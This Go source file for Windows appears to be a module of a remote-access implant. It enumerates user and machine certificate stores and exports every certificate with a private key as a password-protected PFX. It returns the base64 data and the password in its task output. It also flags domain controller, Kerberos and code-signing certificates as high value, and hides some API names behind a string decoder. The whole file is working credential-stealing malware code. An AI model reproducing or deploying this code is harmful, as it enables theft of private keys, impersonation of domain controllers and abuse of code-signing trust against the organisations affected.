//go:build windows

package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math/big"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	crypt32Dll = syscall.NewLazyDLL(s(SCrypt32))

	procCertOpenStore                     = crypt32Dll.NewProc(s(SCertStore))
	procCertCloseStore                    = crypt32Dll.NewProc("CertCloseStore")
	procCertEnumCertificatesInStore       = crypt32Dll.NewProc(s(SCertEnum))
	procCertDuplicateCertificateContext   = crypt32Dll.NewProc("CertDuplicateCertificateContext")
	procCertAddCertificateContextToStore  = crypt32Dll.NewProc("CertAddCertificateContextToStore")
	procCertGetNameStringW                = crypt32Dll.NewProc("CertGetNameStringW")
	procCertGetCertificateContextProperty = crypt32Dll.NewProc("CertGetCertificateContextProperty")
	procPFXExportCertStoreEx              = crypt32Dll.NewProc("PFXExportCertStoreEx")
)

const (
	certSystemStoreCurrentUser  = 0x00010000
	certSystemStoreLocalMachine = 0x00020000
	certStoreProvSystemW        = 10
	certStoreProvMemory         = 2
	certStoreAddAlways          = 4
	certStoreAddNew             = 1

	exportPrivateKeys               = 0x0004
	reportNotAbleToExportPrivateKey = 0x0002
	pkcs12IncludeExtendedProperties = 0x0010

	certNameSimpleDisplayType = 4
	certNameIssuerFlag        = 1

	certSHA1HashPropID    = 3
	certKeyProvInfoPropID = 2

	x509ASNEncoding  = 0x00000001
	pkcs7ASNEncoding = 0x00010000
)

type cryptIntegerBlob struct {
	cbData uint32
	pbData uintptr
}

type filetime struct {
	dwLowDateTime  uint32
	dwHighDateTime uint32
}

type dataBlob struct {
	cbData uint32
	pbData uintptr
}

type certContext struct {
	dwCertEncodingType uint32
	pbCertEncoded      *byte
	cbCertEncoded      uint32
	pCertInfo          uintptr
	hCertStore         uintptr
}

const (
	CertStoreMy         = "My"
	CertStoreCA         = "CA"
	CertStoreRoot       = "Root"
	CertStoreTrustedPub = "TrustedPublisher"
)

type CertEntry struct {
	Subject     string `json:"subject"`
	Issuer      string `json:"issuer"`
	Serial      string `json:"serial"`
	Thumbprint  string `json:"thumbprint"`
	NotBefore   string `json:"not_before"`
	NotAfter    string `json:"not_after"`
	HasPrivate  bool   `json:"has_private_key"`
	IsMachine   bool   `json:"is_machine"`
	StoreName   string `json:"store_name"`
	PFXData     string `json:"pfx_data,omitempty"`
	PFXPassword string `json:"pfx_password,omitempty"`
}

func enumCertificateStores() []CertEntry {
	var entries []CertEntry
	stores := []string{CertStoreMy, CertStoreCA, CertStoreRoot, CertStoreTrustedPub}

	for _, storeName := range stores {
		userEntries := enumStore(false, storeName)
		entries = append(entries, userEntries...)

		machineEntries := enumStore(true, storeName)
		entries = append(entries, machineEntries...)
	}

	return entries
}

func enumStore(isMachine bool, storeName string) []CertEntry {
	var entries []CertEntry
	location := uint32(certSystemStoreCurrentUser)
	if isMachine {
		location = certSystemStoreLocalMachine
	}

	namePtr, err := syscall.UTF16PtrFromString(storeName)
	if err != nil {
		return nil
	}

	store, _, _ := procCertOpenStore.Call(
		certStoreProvSystemW,
		0,
		0,
		uintptr(location),
		uintptr(unsafe.Pointer(namePtr)),
	)
	if store == 0 {
		return nil
	}
	defer procCertCloseStore.Call(store, 0)

	var ctx uintptr = 0
	for {
		ctx, _, _ = procCertEnumCertificatesInStore.Call(store, ctx)
		if ctx == 0 {
			break
		}

		entry := buildCertEntry(ctx, isMachine, storeName)
		entries = append(entries, entry)
	}

	return entries
}

func buildCertEntry(ctx uintptr, isMachine bool, storeName string) CertEntry {
	entry := CertEntry{
		StoreName: storeName,
		IsMachine: isMachine,
	}

	entry.Subject = getCertNameString(ctx, certNameSimpleDisplayType, 0)
	entry.Issuer = getCertNameString(ctx, certNameSimpleDisplayType, certNameIssuerFlag)
	entry.Thumbprint = getCertThumbprint(ctx)

	entry.HasPrivate = hasPrivateKey(ctx)

	serial, nb, na := readCertInfoFields(ctx)
	entry.Serial = serial
	if !nb.IsZero() {
		entry.NotBefore = nb.Format(time.RFC3339)
	}
	if !na.IsZero() {
		entry.NotAfter = na.Format(time.RFC3339)
	}

	if entry.HasPrivate {
		pfxPassword := generatePassword(20)
		pfxData, err := exportCertWithPrivateKey(ctx, pfxPassword)
		if err == nil && len(pfxData) > 0 {
			entry.PFXData = base64.StdEncoding.EncodeToString(pfxData)
			entry.PFXPassword = pfxPassword
		}
	}

	return entry
}

func getCertNameString(certCtx uintptr, dwType, dwFlags uint32) string {
	size, _, _ := procCertGetNameStringW.Call(
		certCtx, uintptr(dwType), uintptr(dwFlags), 0, 0, 0,
	)
	if size == 0 {
		return ""
	}

	buf := make([]uint16, size)
	ret, _, _ := procCertGetNameStringW.Call(
		certCtx, uintptr(dwType), uintptr(dwFlags), 0,
		uintptr(unsafe.Pointer(&buf[0])), uintptr(size),
	)
	if ret == 0 {
		return ""
	}
	return syscall.UTF16ToString(buf)
}

func getCertThumbprint(certCtx uintptr) string {
	var size uint32
	ret, _, _ := procCertGetCertificateContextProperty.Call(
		certCtx, certSHA1HashPropID, 0, uintptr(unsafe.Pointer(&size)),
	)
	if ret == 0 || size == 0 {
		return ""
	}
	buf := make([]byte, size)
	ret, _, _ = procCertGetCertificateContextProperty.Call(
		certCtx, certSHA1HashPropID,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&size)),
	)
	if ret == 0 {
		return ""
	}
	return hex.EncodeToString(buf)
}

func hasPrivateKey(certCtx uintptr) bool {
	var size uint32
	ret, _, _ := procCertGetCertificateContextProperty.Call(
		certCtx, certKeyProvInfoPropID, 0, uintptr(unsafe.Pointer(&size)),
	)
	return ret != 0 && size > 0
}

func readCertInfoFields(certCtx uintptr) (serial string, notBefore, notAfter time.Time) {
	cCtx := (*certContext)(unsafe.Pointer(certCtx))
	if cCtx == nil || cCtx.pCertInfo == 0 {
		return
	}
	pCertInfo := cCtx.pCertInfo

	serialBlob := *(*cryptIntegerBlob)(unsafe.Pointer(pCertInfo + 8))
	if serialBlob.pbData != 0 && serialBlob.cbData > 0 {
		data := (*[1 << 20]byte)(unsafe.Pointer(serialBlob.pbData))[:serialBlob.cbData]
		serial = hex.EncodeToString(data)
	}

	nft := *(*filetime)(unsafe.Pointer(pCertInfo + 64))
	nft2 := *(*filetime)(unsafe.Pointer(pCertInfo + 72))
	notBefore = filetimeToTime(nft)
	notAfter = filetimeToTime(nft2)
	return
}

func filetimeToTime(ft filetime) time.Time {
	nsec := int64(ft.dwHighDateTime)<<32 + int64(ft.dwLowDateTime)
	const unixEpoch = 11644473600 * 10000000
	if nsec < unixEpoch {
		return time.Time{}
	}
	sec := (nsec - unixEpoch) / 10000000
	return time.Unix(sec, 0)
}

func exportCertWithPrivateKey(certCtx uintptr, password string) ([]byte, error) {
	passPtr, err := syscall.UTF16PtrFromString(password)
	if err != nil {
		return nil, err
	}

	memStore, _, _ := procCertOpenStore.Call(
		certStoreProvMemory, 0, 0, 0, 0,
	)
	if memStore == 0 {
		return nil, fmt.Errorf("CertOpenStore(Memory) failed")
	}
	defer procCertCloseStore.Call(memStore, 0)

	ret, _, _ := procCertAddCertificateContextToStore.Call(
		memStore, certCtx, certStoreAddAlways, 0,
	)
	if ret == 0 {
		return nil, fmt.Errorf("CertAddCertificateContextToStore failed")
	}

	var blob dataBlob
	ret, _, _ = procPFXExportCertStoreEx.Call(
		memStore,
		uintptr(unsafe.Pointer(&blob)),
		uintptr(unsafe.Pointer(passPtr)),
		0,
		exportPrivateKeys|reportNotAbleToExportPrivateKey|pkcs12IncludeExtendedProperties,
	)
	if ret == 0 {
		return nil, fmt.Errorf("PFXExportCertStoreEx (size) failed")
	}
	if blob.cbData == 0 {
		return nil, fmt.Errorf("PFX export returned zero size")
	}

	buf := make([]byte, blob.cbData)
	blob.pbData = uintptr(unsafe.Pointer(&buf[0]))
	ret, _, _ = procPFXExportCertStoreEx.Call(
		memStore,
		uintptr(unsafe.Pointer(&blob)),
		uintptr(unsafe.Pointer(passPtr)),
		0,
		exportPrivateKeys|reportNotAbleToExportPrivateKey|pkcs12IncludeExtendedProperties,
	)
	if ret == 0 {
		return nil, fmt.Errorf("PFXExportCertStoreEx (export) failed")
	}

	return buf, nil
}

func generatePassword(length int) string {
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*"
	b := make([]byte, length)
	for i := range b {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		b[i] = charset[n.Int64()]
	}
	return string(b)
}

func isHighValueCert(entry *CertEntry) bool {
	lower := strings.ToLower(entry.Subject)
	highValueKeywords := []string{
		"domain controller",
		"domain controller authentication",
		"kerberos",
		"dc=",
		"code signing",
		"microsoft",
		"active directory",
	}
	for _, kw := range highValueKeywords {
		if strings.Contains(lower, kw) {
			return true
		}
	}
	return false
}

func handleCertStoreListImpl(task Task, res *TaskResult) {
	entries := enumCertificateStores()

	if len(entries) == 0 {
		res.Output = "No certificates found in store."
		return
	}

	var result strings.Builder
	result.WriteString(fmt.Sprintf("=== Certificate Store Enumeration ===\n"))
	result.WriteString(fmt.Sprintf("Total certificates found: %d\n\n", len(entries)))

	highValueCount := 0
	exportedCount := 0
	for _, e := range entries {
		if isHighValueCert(&e) {
			highValueCount++
		}
		if e.PFXData != "" {
			exportedCount++
		}
	}
	result.WriteString(fmt.Sprintf("High-value certs: %d\n", highValueCount))
	result.WriteString(fmt.Sprintf("PFX exports: %d\n\n", exportedCount))

	for i, e := range entries {
		storeType := "CurrentUser"
		if e.IsMachine {
			storeType = "LocalMachine"
		}

		highValue := ""
		if isHighValueCert(&e) {
			highValue = " [HIGH VALUE]"
		}

		result.WriteString(fmt.Sprintf("[%d]%s\n", i+1, highValue))
		result.WriteString(fmt.Sprintf("  Subject:      %s\n", e.Subject))
		result.WriteString(fmt.Sprintf("  Issuer:       %s\n", e.Issuer))
		result.WriteString(fmt.Sprintf("  Serial:       %s\n", e.Serial))
		result.WriteString(fmt.Sprintf("  Thumbprint:   %s\n", e.Thumbprint))
		result.WriteString(fmt.Sprintf("  Valid:        %s - %s\n", e.NotBefore, e.NotAfter))
		result.WriteString(fmt.Sprintf("  Private Key:  %v\n", e.HasPrivate))
		result.WriteString(fmt.Sprintf("  Store:        %s\\%s\n", storeType, e.StoreName))

		if e.PFXData != "" {
			pfxPreview := e.PFXData
			if len(pfxPreview) > 50 {
				pfxPreview = pfxPreview[:50] + "..."
			}
			result.WriteString(fmt.Sprintf("  PFX:          %s\n", pfxPreview))
			result.WriteString(fmt.Sprintf("  PFX Password: %s\n", e.PFXPassword))
		} else if e.HasPrivate {
			result.WriteString(fmt.Sprintf("  PFX:          (non-exportable private key)\n"))
		}
		result.WriteString("\n")
	}

	res.Output = result.String()
}
